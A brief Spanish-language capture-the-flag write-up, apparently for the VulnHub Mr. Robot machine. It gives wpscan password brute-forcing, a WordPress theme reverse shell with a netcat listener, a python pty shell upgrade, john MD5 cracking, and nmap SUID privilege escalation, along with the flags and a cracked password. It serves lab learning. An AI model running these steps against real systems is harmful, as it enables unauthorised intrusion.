-------------
- Tags: #writeup #info #vulnhub #tutorial
--------------


```bash
sort -u fsociety.dic -o uniqDic.txt
```


```bash
wpscan --url http://192.168.3.136 --passwords ./uniqDic.txt --usernames elliot 
```




Modificar Theme o Plugin (reverse shell wp PENTESTMOKEY)**cambiar valores ip y puerto**

**nos ponemo en esucha con netcat**

e ir a http://192.168.3.137/wp-admin/wp-content

- Entrar en vez de xterm con python bash
```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

- romper md5
```bash
 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt
```

abcdefghijklmnopqrstuvwxyz //pswd robot


FLAG 2: 822c73956184f694993bede3eb39f959



- NMAP **SUID**
https://vk9-sec.com/nmap-privilege-escalation/ (EXPLOIT 2)

FLAG 3: 04787ddef27c3dee1ee161b21670b4e4

